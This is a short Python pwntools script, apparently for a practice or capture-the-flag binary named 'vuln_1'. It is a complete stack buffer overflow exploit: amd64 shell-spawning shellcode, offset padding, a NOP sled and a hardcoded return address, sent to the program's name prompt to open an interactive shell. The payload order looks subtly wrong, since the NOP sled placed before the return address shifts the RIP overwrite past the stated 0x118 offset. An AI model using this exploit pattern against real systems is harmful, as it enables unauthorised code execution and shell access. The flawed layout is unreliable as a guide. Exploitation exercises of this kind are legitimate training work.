from pwn import *

# Overflow saved RIP after 280, 0x118 bytes
overflow_offset_rip = 0x118

# Point saved RIP to address of start of the buffer
new_rip = 0x7fffffffe058

# shellcode
# tell pwltools we're using 64 bit
context.update(arch="amd64")

NOP_SLED = b"\x90" * 2048

# assemble shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

payload = shellcode
payload += b"A" * (overflow_offset_rip - len(shellcode))
payload += NOP_SLED
#land the RIP in to return to start of shellcode
payload += p64(new_rip)

p = process("./vuln_1")

p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
